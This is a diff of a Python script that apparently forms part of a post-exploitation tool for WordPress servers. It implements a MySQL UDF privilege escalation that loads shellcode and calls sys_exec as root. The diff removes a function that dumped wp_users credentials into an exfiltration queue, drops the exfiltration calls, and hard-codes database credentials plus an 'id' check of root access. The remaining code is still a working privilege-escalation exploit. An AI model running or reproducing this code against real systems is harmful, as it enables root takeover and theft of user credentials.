@@ -1,11 +1,9 @@
 #!/usr/bin/python3
-from lib2to3.pytree import Base
 import subprocess
 import platform, random
 import os, re
 from queue import Queue
 from typing import TypedDict
-from ..helper import extract_file, extract_string
 class Db_Creds(TypedDict):
     password: str
     user: str
@@ -26,25 +24,13 @@ def get_path(f_name):
                 if name == f_name:
                     f_path = os.path.abspath(os.path.join(root, name))
                     breaker = True 
+                    #print("[+] File Path: " + f_path) # 1.W QUEUE
                     return f_path
             if breaker:
                 break   
     except:
         pass
     return f_path 
-
-def dump_wp_db(db_creds:Db_Creds, exfiltrate:Queue):
-    try:
-        cmd = f"mysql -u {db_creds['user']} --password='{db_creds['pw']}' -e 'select * from {db_creds['name']}.wp_users \G;' > {DUMP_FILE}"
-        status = os.system(cmd)
-        if os.path.isfile(DUMP_FILE) and status == 0:
-            extract_string(exfiltrate, f"Dumping DB: {db_creds['name']} in to File: {DUMP_FILE}")
-            extract_file(exfiltrate, DUMP_FILE)
-            
-            return True
-        return False
-    except:
-        return False
 
 def get_plugin_dir():
     plugin_dir = ""
@@ -93,7 +79,7 @@ def crate_function(udf_filename):
 def sys_exec(m_path):
     try:
         print("[#] Execute Root Command")
-        cmd = f"{BASE_CMD} \"select sys_exec(\'.{m_path}\');\" > /dev/null"
+        cmd = f"{BASE_CMD} \"select sys_exec(\'echo {m_path}; id\');\" > /dev/null"
         stdout, stderr = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
         if stderr != b'':
             print("[!] Run sys_exec Failed") # 6.F QUEUE
@@ -117,9 +103,13 @@ def del_function():
     except:
         return False
 
-def priv_esc_udf(db_creds:Db_Creds, exfiltrate:Queue):
+def priv_esc_udf():
     global BASE_CMD, SHELLCODE
-    extract_string(exfiltrate, f"[PrivEsc] udf_root Exploit Start")
+    db_creds = dict()
+    db_creds['user'] = 'wp_user'
+    db_creds['pw'] = 'p@ssword'
+
+    print("[PrivEsc] udf_root Exploit Start")
     try:
         BASE_CMD = f"mysql -u {db_creds['user']} --password='{db_creds['pw']}' -e"
         if (platform.architecture()[0] == '32bit'):
@@ -135,7 +125,8 @@ def priv_esc_udf(db_creds:Db_Creds, exfiltrate:Queue):
                     m_path = get_path('mclient')
                     if m_path:
                         if sys_exec(m_path):
-                            extract_string(exfiltrate, f"[PrivEsc] udf_root Exploit Works")
+                            print(f"[PrivEsc] udf_root Exploit Works")
+                            
                             del_function()
                             return True
     except:
